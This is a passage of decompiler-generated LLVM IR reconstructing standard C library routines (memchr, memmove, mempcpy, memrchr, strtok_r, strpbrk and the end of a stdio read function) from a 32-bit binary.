  %v1_8062a84 = or i32 %v3_8062a53, 4
  store i32 %v1_8062a84, i32* @ecx, align 4
  %v1_8062a87 = trunc i32 %v1_8062a84 to i16
  store i16 %v1_8062a87, i16* %v1_8062a53, align 2
  br label %dec_label_pc_8062aea

dec_label_pc_8062a8c:                             ; preds = %dec_label_pc_8062a7e
  %v3_8062a8c = and i16 %v2_8062a53, 768
  %v4_8062a8c = icmp eq i16 %v3_8062a8c, 0
  br i1 %v4_8062a8c, label %dec_label_pc_8062aa1, label %dec_label_pc_8062a91

dec_label_pc_8062a91:                             ; preds = %dec_label_pc_8062a8c
  %v3_8062a99 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_80753fc.617 to i16*))
  %v0_8062aa1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062aa1

dec_label_pc_8062aa1:                             ; preds = %dec_label_pc_8062a8c, %dec_label_pc_8062a91
  %v0_8062ad6 = phi i32 [ %v2_8062a87, %dec_label_pc_8062a8c ], [ %v0_8062aa1.pre, %dec_label_pc_8062a91 ]
  %v1_8062aa1 = add i32 %v0_8062ad6, 8
  %v2_8062aa1 = inttoptr i32 %v1_8062aa1 to i32*
  %v3_8062aa1 = load i32, i32* %v2_8062aa1, align 4
  %v1_8062aa4 = add i32 %v0_8062ad6, 12
  %v2_8062aa4 = inttoptr i32 %v1_8062aa4 to i32*
  %v3_8062aa4 = load i32, i32* %v2_8062aa4, align 4
  %v15_8062aa4 = icmp eq i32 %v3_8062aa4, %v3_8062aa1
  br i1 %v15_8062aa4, label %dec_label_pc_8062ace, label %dec_label_pc_8062aa9

dec_label_pc_8062aa9:                             ; preds = %dec_label_pc_8062aa1
  %v2_8062aac = add i32 %v0_8062ad6, 24
  %v3_8062aac = inttoptr i32 %v2_8062aac to i32*
  store i32 %v3_8062aa1, i32* %v3_8062aac, align 4
  %v0_8062aaf = load i32, i32* @ebx, align 4
  %v2_8062ab0 = call i32 @__stdio_rfill(i32 %v0_8062aaf)
  %v1_8062ab8 = icmp eq i32 %v2_8062ab0, 0
  br i1 %v1_8062ab8, label %dec_label_pc_8062aea, label %dec_label_pc_8062abc

dec_label_pc_8062abc:                             ; preds = %dec_label_pc_8062aa9
  %v0_8062abc = load i32, i32* @ebx, align 4
  %v1_8062abc = add i32 %v0_8062abc, 20
  %v2_8062abc = inttoptr i32 %v1_8062abc to i32*
  %v3_8062abc = load i32, i32* %v2_8062abc, align 4
  %v2_8062abf = add i32 %v0_8062abc, 24
  %v3_8062abf = inttoptr i32 %v2_8062abf to i32*
  store i32 %v3_8062abc, i32* %v3_8062abf, align 4
  %v0_8062ac2 = load i32, i32* @ebx, align 4
  %v1_8062ac2 = add i32 %v0_8062ac2, 16
  %v2_8062ac2 = inttoptr i32 %v1_8062ac2 to i32*
  %v3_8062ac2 = load i32, i32* %v2_8062ac2, align 4
  br label %dec_label_pc_8062ac5

dec_label_pc_8062ac5:                             ; preds = %dec_label_pc_8062a76, %entry, %dec_label_pc_8062abc
  %v1_8062ac9 = phi i32 [ %v2_8062a87, %dec_label_pc_8062a76 ], [ %v4_8062a1c, %entry ], [ %v0_8062ac2, %dec_label_pc_8062abc ]
  %v0_8062ac5 = phi i32 [ %v3_8062a76, %dec_label_pc_8062a76 ], [ %v3_8062a20, %entry ], [ %v3_8062ac2, %dec_label_pc_8062abc ]
  %v1_8062ac5 = inttoptr i32 %v0_8062ac5 to i8*
  %v2_8062ac5 = load i8, i8* %v1_8062ac5, align 1
  %v3_8062ac5 = zext i8 %v2_8062ac5 to i32
  store i32 %v3_8062ac5, i32* @edx, align 4
  %v1_8062ac8 = add i32 %v0_8062ac5, 1
  %v2_8062ac9 = add i32 %v1_8062ac9, 16
  %v3_8062ac9 = inttoptr i32 %v2_8062ac9 to i32*
  store i32 %v1_8062ac8, i32* %v3_8062ac9, align 4
  %v0_8062af0.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8062aed

dec_label_pc_8062ace:                             ; preds = %dec_label_pc_8062aa1
  %v2_8062ad1 = ptrtoint i8* %stack_var_-5 to i32
  %v5_8062ad6 = inttoptr i32 %v0_8062ad6 to i16*
  %v5_8062ad7 = call i32 @__stdio_READ(i16* %v5_8062ad6, i32 %v2_8062ad1, i32 1)
  %v1_8062adf = icmp eq i32 %v5_8062ad7, 0
  br i1 %v1_8062adf, label %dec_label_pc_8062aea, label %dec_label_pc_8062ae3

dec_label_pc_8062ae3:                             ; preds = %dec_label_pc_8062ace
  %v3_8062ae3 = load i8, i8* %stack_var_-5, align 1
  %v4_8062ae3 = sext i8 %v3_8062ae3 to i32
  store i32 %v4_8062ae3, i32* @edx, align 4
  br label %dec_label_pc_8062aed

dec_label_pc_8062aea:                             ; preds = %dec_label_pc_8062ace, %dec_label_pc_8062aa9, %dec_label_pc_8062a3b, %dec_label_pc_8062a84
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8062aed

dec_label_pc_8062aed:                             ; preds = %dec_label_pc_8062ae3, %dec_label_pc_8062ac5, %dec_label_pc_8062a5b, %dec_label_pc_8062aea
  %v0_8062af0 = phi i32 [ %v4_8062ae3, %dec_label_pc_8062ae3 ], [ %v0_8062af0.pre, %dec_label_pc_8062ac5 ], [ %v1_8062a71, %dec_label_pc_8062a5b ], [ -1, %dec_label_pc_8062aea ]
  store i32 %v0_8062a18, i32* @ebx, align 4
  ret i32 %v0_8062af0

; uselistorder directives
  uselistorder i32 %v0_8062ac5, { 1, 0 }
  uselistorder i32 %v3_8062aa1, { 1, 0 }
  uselistorder i32 %v0_8062ad6, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8062a76, { 1, 0 }
  uselistorder i32 %v1_8062a71, { 1, 0 }
  uselistorder i16 %v2_8062a53, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8062a87, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_8075440.616, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8062aed, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8062aea, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8062ac5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062aa1, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8062af4 = load i32, i32* @edi, align 4
  store i32 %v0_8062af4, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8062afb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8062afb, i32* %edi.global-to-local, align 4
  %v1_8062b03 = icmp eq i32 %arg3, 0
  store i1 %v1_8062b03, i1* %zf.global-to-local, align 1
  br i1 %v1_8062b03, label %dec_label_pc_8062b13, label %dec_label_pc_8062b07

dec_label_pc_8062b07:                             ; preds = %entry
  %v2_8062b07 = call i32 @_strlen(i8* %arg1)
  %v3_8062b07 = mul i32 %v2_8062b07, -1
  %v4_8062b07 = add i32 %v3_8062b07, -2
  store i32 %v4_8062b07, i32* @ecx, align 4
  %v0_8062b09 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8062b09, label %dec_label_pc_8062b07.dec_label_pc_8062b10_crit_edge, label %dec_label_pc_8062b0b

dec_label_pc_8062b07.dec_label_pc_8062b10_crit_edge: ; preds = %dec_label_pc_8062b07
  %v0_8062b10.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8062b10.pre, -1
  br label %dec_label_pc_8062b10

dec_label_pc_8062b0b:                             ; preds = %dec_label_pc_8062b07
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062b10

dec_label_pc_8062b10:                             ; preds = %dec_label_pc_8062b07.dec_label_pc_8062b10_crit_edge, %dec_label_pc_8062b0b
  %v0_8062b10 = phi i32 [ %phitmp, %dec_label_pc_8062b07.dec_label_pc_8062b10_crit_edge ], [ 0, %dec_label_pc_8062b0b ]
  %v8_8062b10 = icmp eq i32 %v0_8062b10, 0
  store i1 %v8_8062b10, i1* %zf.global-to-local, align 1
  store i32 %v0_8062b10, i32* %edi.global-to-local, align 4
  %v2_8062b13.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8062b13

dec_label_pc_8062b13:                             ; preds = %entry, %dec_label_pc_8062b10
  %v0_8062b14 = phi i32 [ 0, %entry ], [ %v0_8062b10, %dec_label_pc_8062b10 ]
  %v2_8062b13 = phi i32 [ %v0_8062af4, %entry ], [ %v2_8062b13.pre, %dec_label_pc_8062b10 ]
  store i32 %v2_8062b13, i32* @edi, align 4
  ret i32 %v0_8062b14

; uselistorder directives
  uselistorder i32 %v0_8062b10, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8062b13, { 1, 0 }
  uselistorder label %dec_label_pc_8062b10, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8062b19 = load i32, i32* @esi, align 4
  store i32 %v0_8062b19, i32* %stack_var_-8, align 4
  %v4_8062b1a = ptrtoint i8* %arg1 to i32
  %v9_8062b26 = icmp ugt i8* %tmp3, %arg1
  %v1_8062b28 = icmp eq i1 %v9_8062b26, false
  br i1 %v1_8062b28, label %dec_label_pc_8062b30, label %dec_label_pc_8062b2a

dec_label_pc_8062b2a:                             ; preds = %entry
  %v7_8062b2c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  %v8_8062b2c = ptrtoint i8* %v7_8062b2c to i32
  store i32 %v8_8062b2c, i32* @ecx, align 4
  br label %dec_label_pc_8062b3c

dec_label_pc_8062b30:                             ; preds = %entry
  %v3_8062b30 = add i32 %arg2, -1
  %v4_8062b30 = add i32 %v3_8062b30, %tmp
  %v5_8062b30 = inttoptr i32 %v4_8062b30 to i8*
  %v3_8062b34 = add i32 %v4_8062b1a, -1
  %v4_8062b34 = add i32 %v3_8062b34, %tmp
  %v5_8062b34 = inttoptr i32 %v4_8062b34 to i8*
  %v7_8062b39 = call i8* @_memcpy(i8* %v5_8062b34, i8* %v5_8062b30, i32 %tmp)
  %v8_8062b39 = ptrtoint i8* %v7_8062b39 to i32
  store i32 %v8_8062b39, i32* @ecx, align 4
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8062b3c

dec_label_pc_8062b3c:                             ; preds = %dec_label_pc_8062b2a, %dec_label_pc_8062b30
  %v2_8062b3c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8062b3c, i32* @esi, align 4
  ret i32 %v4_8062b1a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062b3c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8062b40 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8062b53 = inttoptr i32 %arg1 to i16*
  %v4_8062b53 = call i32 @memcpy(i16* %v3_8062b53, i32 %arg2, i32 %arg3)
  %v0_8062b5b = load i32, i32* @esi, align 4
  %v2_8062b5b = add i32 %v0_8062b5b, %arg3
  store i32 %v0_8062b40, i32* @esi, align 4
  ret i32 %v2_8062b5b
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8062b69 = urem i32 %arg2, 256
  %v4_8062b75 = sext i8 %arg1 to i32
  %v2_8062b79 = add i32 %v4_8062b75, %arg3
  %v1_8062b8b7 = icmp eq i32 %arg3, 0
  br i1 %v1_8062b8b7, label %dec_label_pc_8062b93, label %dec_label_pc_8062b8f

dec_label_pc_8062b7d:                             ; preds = %dec_label_pc_8062b8f
  %v1_8062b7d = add i32 %v0_8062b7d, -1
  %v5_8062b7e = load i32, i32* @edx, align 4
  %v6_8062b7e = and i32 %v5_8062b7e, -256
  %v7_8062b7e = or i32 %v6_8062b7e, %v4_8062b69
  store i32 %v7_8062b7e, i32* @edx, align 4
  %v1_8062b82 = inttoptr i32 %v1_8062b7d to i8*
  %v2_8062b82 = load i8, i8* %v1_8062b82, align 1
  %v15_8062b82 = icmp eq i8 %v2_8062b82, %tmp
  br i1 %v15_8062b82, label %dec_label_pc_8062c10, label %dec_label_pc_8062b8a

dec_label_pc_8062b8a:                             ; preds = %dec_label_pc_8062b7d
  %v1_8062b8a = add i32 %v0_8062b8a, -1
  %v8_8062b8a = icmp eq i32 %v1_8062b8a, 0
  br i1 %v8_8062b8a, label %dec_label_pc_8062b93, label %dec_label_pc_8062b8f

dec_label_pc_8062b8f:                             ; preds = %entry, %dec_label_pc_8062b8a
  %v0_8062b8a = phi i32 [ %v1_8062b8a, %dec_label_pc_8062b8a ], [ %arg3, %entry ]
  %v0_8062b7d = phi i32 [ %v1_8062b7d, %dec_label_pc_8062b8a ], [ %v2_8062b79, %entry ]
  %v2_8062b8f = urem i32 %v0_8062b7d, 4
  %v3_8062b8f = icmp eq i32 %v2_8062b8f, 0
  %v1_8062b91 = icmp eq i1 %v3_8062b8f, false
  br i1 %v1_8062b91, label %dec_label_pc_8062b7d, label %dec_label_pc_8062b93

dec_label_pc_8062b93:                             ; preds = %dec_label_pc_8062b8a, %dec_label_pc_8062b8f, %entry
  %v0_8062bf6.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8062b8a ], [ %v0_8062b8a, %dec_label_pc_8062b8f ]
  %v0_8062b98 = phi i32 [ %v2_8062b79, %entry ], [ %v1_8062b7d, %dec_label_pc_8062b8a ], [ %v0_8062b7d, %dec_label_pc_8062b8f ]
  store i32 %v0_8062b98, i32* @ecx, align 4
  %v2_8062b9c = mul nuw nsw i32 %v4_8062b69, 256
  %v2_8062b9f = or i32 %v2_8062b9c, %v4_8062b69
  %v2_8062ba3 = mul i32 %v2_8062b9f, 65536
  %v2_8062ba6 = or i32 %v2_8062ba3, %v2_8062b9f
  %v6_8062bf955 = icmp ugt i32 %v0_8062bf6.pr, 3
  br i1 %v6_8062bf955, label %dec_label_pc_8062baa, label %dec_label_pc_8062bfb

dec_label_pc_8062baa:                             ; preds = %dec_label_pc_8062b93, %dec_label_pc_8062bf3
  %v0_8062bf357 = phi i32 [ %v1_8062bf3, %dec_label_pc_8062bf3 ], [ %v0_8062bf6.pr, %dec_label_pc_8062b93 ]
  %v0_8062baa56 = phi i32 [ %v1_8062baa, %dec_label_pc_8062bf3 ], [ %v0_8062b98, %dec_label_pc_8062b93 ]
  %v1_8062baa = add i32 %v0_8062baa56, -4
  store i32 %v1_8062baa, i32* @ecx, align 4
  %v2_8062baf = inttoptr i32 %v1_8062baa to i32*
  %v3_8062baf = load i32, i32* %v2_8062baf, align 4
  %v4_8062baf = xor i32 %v3_8062baf, %v2_8062ba6
  %v1_8062bb1 = add i32 %v4_8062baf, 2130640639
  %v1_8062bb7 = sub i32 -1, %v4_8062baf
  %v2_8062bb9 = xor i32 %v1_8062bb1, %v1_8062bb7
  %v1_8062bbb = and i32 %v2_8062bb9, -2130640640
  %v2_8062bbb = icmp eq i32 %v1_8062bbb, 0
  br i1 %v2_8062bbb, label %dec_label_pc_8062bf3, label %dec_label_pc_8062bc3

dec_label_pc_8062bc3:                             ; preds = %dec_label_pc_8062baa
  %v7_8062bc3 = or i32 %v1_8062bbb, %v4_8062b69
  %v1_8062bc7 = add i32 %v0_8062baa56, -1
  %v2_8062bca = inttoptr i32 %v1_8062bc7 to i8*
  %v3_8062bca = load i8, i8* %v2_8062bca, align 1
  %v16_8062bca = icmp eq i8 %v3_8062bca, %tmp
  br i1 %v16_8062bca, label %dec_label_pc_8062c10, label %dec_label_pc_8062bcf

dec_label_pc_8062bcf:                             ; preds = %dec_label_pc_8062bc3
  %v1_8062bd3 = add i32 %v0_8062baa56, -2
  %v2_8062bd6 = inttoptr i32 %v1_8062bd3 to i8*
  %v3_8062bd6 = load i8, i8* %v2_8062bd6, align 1
  %v16_8062bd6 = icmp eq i8 %v3_8062bd6, %tmp
  br i1 %v16_8062bd6, label %dec_label_pc_8062c10, label %dec_label_pc_8062bdb

dec_label_pc_8062bdb:                             ; preds = %dec_label_pc_8062bcf
  %v1_8062bdf = add i32 %v0_8062baa56, -3
  %v2_8062be2 = inttoptr i32 %v1_8062bdf to i8*
  %v3_8062be2 = load i8, i8* %v2_8062be2, align 1
  %v16_8062be2 = icmp eq i8 %v3_8062be2, %tmp
  br i1 %v16_8062be2, label %dec_label_pc_8062c10, label %dec_label_pc_8062be7

dec_label_pc_8062be7:                             ; preds = %dec_label_pc_8062bdb
  %v1_8062beb = inttoptr i32 %v1_8062baa to i8*
  %v2_8062beb = load i8, i8* %v1_8062beb, align 1
  %v15_8062beb = icmp eq i8 %v2_8062beb, %tmp
  %v1_8062bed = icmp eq i1 %v15_8062beb, false
  br i1 %v1_8062bed, label %dec_label_pc_8062bf3, label %dec_label_pc_8062bef

dec_label_pc_8062bef:                             ; preds = %dec_label_pc_8062be7
  br label %dec_label_pc_8062c10

dec_label_pc_8062bf3:                             ; preds = %dec_label_pc_8062be7, %dec_label_pc_8062baa
  %v5_8062c0027 = phi i32 [ %v7_8062bc3, %dec_label_pc_8062be7 ], [ 0, %dec_label_pc_8062baa ]
  %v1_8062bf3 = add i32 %v0_8062bf357, -4
  %v6_8062bf9 = icmp ugt i32 %v1_8062bf3, 3
  br i1 %v6_8062bf9, label %dec_label_pc_8062baa, label %dec_label_pc_8062bfb

dec_label_pc_8062bfb:                             ; preds = %dec_label_pc_8062bf3, %dec_label_pc_8062b93
  %v5_8062c0026.lcssa = phi i32 [ %v4_8062b69, %dec_label_pc_8062b93 ], [ %v5_8062c0027, %dec_label_pc_8062bf3 ]
  %v0_8062baa.lcssa = phi i32 [ %v0_8062b98, %dec_label_pc_8062b93 ], [ %v1_8062baa, %dec_label_pc_8062bf3 ]
  %v0_8062bf3.lcssa = phi i32 [ %v0_8062bf6.pr, %dec_label_pc_8062b93 ], [ %v1_8062bf3, %dec_label_pc_8062bf3 ]
  br label %dec_label_pc_8062c08

dec_label_pc_8062bff:                             ; preds = %dec_label_pc_8062c08
  %v1_8062c08 = add i32 %v0_8062c08, -1
  %v1_8062bff = add i32 %v0_8062bff, -1
  %v6_8062c00 = and i32 %v5_8062c00, -256
  %v7_8062c00 = or i32 %v6_8062c00, %v4_8062b69
  %v1_8062c04 = inttoptr i32 %v1_8062bff to i8*
  %v2_8062c04 = load i8, i8* %v1_8062c04, align 1
  %v15_8062c04 = icmp eq i8 %v2_8062c04, %tmp
  br i1 %v15_8062c04, label %dec_label_pc_8062c10, label %dec_label_pc_8062c08

dec_label_pc_8062c08:                             ; preds = %dec_label_pc_8062bff, %dec_label_pc_8062bfb
  %v5_8062c00 = phi i32 [ %v7_8062c00, %dec_label_pc_8062bff ], [ %v5_8062c0026.lcssa, %dec_label_pc_8062bfb ]
  %v0_8062bff = phi i32 [ %v1_8062bff, %dec_label_pc_8062bff ], [ %v0_8062baa.lcssa, %dec_label_pc_8062bfb ]
  %v0_8062c08 = phi i32 [ %v1_8062c08, %dec_label_pc_8062bff ], [ %v0_8062bf3.lcssa, %dec_label_pc_8062bfb ]
  %v10_8062c09 = icmp eq i32 %v0_8062c08, 0
  %v1_8062c0c = icmp eq i1 %v10_8062c09, false
  br i1 %v1_8062c0c, label %dec_label_pc_8062bff, label %dec_label_pc_8062c0e

dec_label_pc_8062c0e:                             ; preds = %dec_label_pc_8062c08
  br label %dec_label_pc_8062c10

dec_label_pc_8062c10:                             ; preds = %dec_label_pc_8062b7d, %dec_label_pc_8062bdb, %dec_label_pc_8062bcf, %dec_label_pc_8062bc3, %dec_label_pc_8062bff, %dec_label_pc_8062bef, %dec_label_pc_8062c0e
  %v0_8062c13 = phi i32 [ %v1_8062baa, %dec_label_pc_8062bef ], [ 0, %dec_label_pc_8062c0e ], [ %v1_8062bff, %dec_label_pc_8062bff ], [ %v1_8062bdf, %dec_label_pc_8062bdb ], [ %v1_8062bd3, %dec_label_pc_8062bcf ], [ %v1_8062bc7, %dec_label_pc_8062bc3 ], [ %v1_8062b7d, %dec_label_pc_8062b7d ]
  ret i32 %v0_8062c13

; uselistorder directives
  uselistorder i32 %v0_8062c08, { 1, 0 }
  uselistorder i32 %v1_8062bf3, { 0, 2, 1 }
  uselistorder i32 %v1_8062baa, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8062baa56, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8062b9f, { 1, 0 }
  uselistorder i32 %v0_8062b7d, { 1, 0, 2 }
  uselistorder i32 %v2_8062b79, { 1, 0 }
  uselistorder i32 %v4_8062b69, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8062c10, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8062baa, { 1, 0 }
  uselistorder label %dec_label_pc_8062b93, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8062b8f, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8062c14 = load i32, i32* @edi, align 4
  %v0_8062c15 = load i32, i32* @esi, align 4
  %v0_8062c16 = load i32, i32* @ebx, align 4
  store i32 %v0_8062c16, i32* %stack_var_-12, align 4
  %v4_8062c17 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8062c17, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8062c23 = icmp eq i8* %arg1, null
  %v1_8062c25 = icmp eq i1 %v1_8062c23, false
  br i1 %v1_8062c25, label %dec_label_pc_8062c29, label %dec_label_pc_8062c27

dec_label_pc_8062c27:                             ; preds = %entry
  %v1_8062c27 = inttoptr i32 %arg3 to i32*
  %v2_8062c27 = load i32, i32* %v1_8062c27, align 4
  store i32 %v2_8062c27, i32* @ebx, align 4
  br label %dec_label_pc_8062c29

dec_label_pc_8062c29:                             ; preds = %entry, %dec_label_pc_8062c27
  %v0_8062c2c = phi i32 [ %v4_8062c17, %entry ], [ %v2_8062c27, %dec_label_pc_8062c27 ]
  %v0_8062c29 = load i32, i32* @ecx, align 4
  %v5_8062c2c = inttoptr i32 %v0_8062c2c to i8*
  %v8_8062c2d = call i32 @__GI_strspn(i8* %v5_8062c2c, i32 %arg2, i32 %v0_8062c29, i32 %v0_8062c29)
  store i32 %v8_8062c2d, i32* %eax.global-to-local, align 4
  %v0_8062c35 = load i32, i32* @ebx, align 4
  %v2_8062c35 = add i32 %v0_8062c35, %v8_8062c2d
  store i32 %v2_8062c35, i32* @ebx, align 4
  %v1_8062c37 = inttoptr i32 %v2_8062c35 to i8*
  %v2_8062c37 = load i8, i8* %v1_8062c37, align 1
  %v3_8062c37 = icmp eq i8 %v2_8062c37, 0
  %v1_8062c3a = icmp eq i1 %v3_8062c37, false
  br i1 %v1_8062c3a, label %dec_label_pc_8062c42, label %dec_label_pc_8062c3c

dec_label_pc_8062c3c:                             ; preds = %dec_label_pc_8062c29
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8062c3e = load i32, i32* @esi, align 4
  %v2_8062c3e = inttoptr i32 %v1_8062c3e to i32*
  store i32 %v2_8062c35, i32* %v2_8062c3e, align 4
  %v0_8062c6c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062c69

dec_label_pc_8062c42:                             ; preds = %dec_label_pc_8062c29
  %v0_8062c44 = load i32, i32* @edi, align 4
  %v4_8062c46 = call i32 @__GI_strpbrk(i8* %v1_8062c37, i32 %v0_8062c44)
  store i32 %v4_8062c46, i32* %eax.global-to-local, align 4
  %v2_8062c4e = icmp eq i32 %v4_8062c46, 0
  %v1_8062c50 = icmp eq i1 %v2_8062c4e, false
  br i1 %v1_8062c50, label %dec_label_pc_8062c61, label %dec_label_pc_8062c52

dec_label_pc_8062c52:                             ; preds = %dec_label_pc_8062c42
  %v0_8062c56 = load i32, i32* @ebx, align 4
  %v5_8062c56 = inttoptr i32 %v0_8062c56 to i8*
  %v8_8062c57 = call i32 @rawmemchr(i8* %v5_8062c56, i32 0, i32 %v4_8062c46, i32 %v4_8062c46)
  br label %dec_label_pc_8062c65

dec_label_pc_8062c61:                             ; preds = %dec_label_pc_8062c42
  %v5_8062c46 = inttoptr i32 %v4_8062c46 to i8*
  store i8 0, i8* %v5_8062c46, align 1
  %v2_8062c64 = add i32 %v4_8062c46, 1
  br label %dec_label_pc_8062c65

dec_label_pc_8062c65:                             ; preds = %dec_label_pc_8062c52, %dec_label_pc_8062c61
  %storemerge = phi i32 [ %v2_8062c64, %dec_label_pc_8062c61 ], [ %v8_8062c57, %dec_label_pc_8062c52 ]
  %v0_8062c65 = phi i32 [ %v2_8062c64, %dec_label_pc_8062c61 ], [ %v8_8062c57, %dec_label_pc_8062c52 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8062c65 = load i32, i32* @esi, align 4
  %v2_8062c65 = inttoptr i32 %v1_8062c65 to i32*
  store i32 %v0_8062c65, i32* %v2_8062c65, align 4
  %v0_8062c67 = load i32, i32* @ebx, align 4
  store i32 %v0_8062c67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062c69

dec_label_pc_8062c69:                             ; preds = %dec_label_pc_8062c3c, %dec_label_pc_8062c65
  %v0_8062c6c = phi i32 [ %v0_8062c6c.pre, %dec_label_pc_8062c3c ], [ %v0_8062c67, %dec_label_pc_8062c65 ]
  %v2_8062c69 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8062c69, i32* @ebx, align 4
  store i32 %v0_8062c15, i32* @esi, align 4
  store i32 %v0_8062c14, i32* @edi, align 4
  ret i32 %v0_8062c6c

; uselistorder directives
  uselistorder i32 %v4_8062c46, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8062c69, { 1, 0 }
  uselistorder label %dec_label_pc_8062c65, { 1, 0 }
  uselistorder label %dec_label_pc_8062c29, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8062c71 = load i32, i32* @ebx, align 4
  %v2_8062c8825 = load i8, i8* %arg1, align 1
  %v4_8062c8a29 = icmp eq i8 %v2_8062c8825, 0
  br i1 %v4_8062c8a29, label %dec_label_pc_8062c92, label %dec_label_pc_8062c8e.lr.ph

dec_label_pc_8062c8e.lr.ph:                       ; preds = %entry
  %v3_8062c8826 = zext i8 %v2_8062c8825 to i32
  %v5_8062c8827 = and i32 %v0_8062c71, -256
  %v6_8062c8828 = or i32 %v3_8062c8826, %v5_8062c8827
  %v4_8062c76 = ptrtoint i8* %arg1 to i32
  %v1_8062c8113 = inttoptr i32 %arg2 to i8*
  %v4_8062c81.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8062c8e

dec_label_pc_8062c7c:                             ; preds = %dec_label_pc_8062c8e, %dec_label_pc_8062c80
  %v6_8062c8123 = phi i32 [ %v6_8062c81, %dec_label_pc_8062c80 ], [ %v6_8062c8117, %dec_label_pc_8062c8e ]
  %v2_8062c8122 = phi i8 [ %v2_8062c81, %dec_label_pc_8062c80 ], [ %v2_8062c8114, %dec_label_pc_8062c8e ]
  %v0_8062c8021 = phi i32 [ %v1_8062c80, %dec_label_pc_8062c80 ], [ %arg2, %dec_label_pc_8062c8e ]
  %v15_8062c7c = icmp eq i8 %v2_8062c8122, %v2_8062c8833
  br i1 %v15_8062c7c, label %dec_label_pc_8062c94, label %dec_label_pc_8062c80

dec_label_pc_8062c80:                             ; preds = %dec_label_pc_8062c7c
  %v1_8062c80 = add i32 %v0_8062c8021, 1
  store i32 %v1_8062c80, i32* @edx, align 4
  %v1_8062c81 = inttoptr i32 %v1_8062c80 to i8*
  %v2_8062c81 = load i8, i8* %v1_8062c81, align 1
  %v3_8062c81 = zext i8 %v2_8062c81 to i32
  %v5_8062c81 = and i32 %v6_8062c8123, -256
  %v6_8062c81 = or i32 %v3_8062c81, %v5_8062c81
  store i32 %v6_8062c81, i32* @ecx, align 4
  %v4_8062c83 = icmp eq i8 %v2_8062c81, 0
  %v1_8062c85 = icmp eq i1 %v4_8062c83, false
  br i1 %v1_8062c85, label %dec_label_pc_8062c7c, label %dec_label_pc_8062c87

dec_label_pc_8062c87:                             ; preds = %dec_label_pc_8062c80, %dec_label_pc_8062c8e
  %v4_8062c81.pre36 = phi i32 [ %v6_8062c8117, %dec_label_pc_8062c8e ], [ %v6_8062c81, %dec_label_pc_8062c80 ]
  %v1_8062c87 = add i32 %v0_8062c8731, 1
  %v1_8062c88 = inttoptr i32 %v1_8062c87 to i8*
  %v2_8062c88 = load i8, i8* %v1_8062c88, align 1
  %v3_8062c88 = zext i8 %v2_8062c88 to i32
  %v5_8062c88 = and i32 %v6_8062c8834, -256
  %v6_8062c88 = or i32 %v3_8062c88, %v5_8062c88
  %v4_8062c8a = icmp eq i8 %v2_8062c88, 0
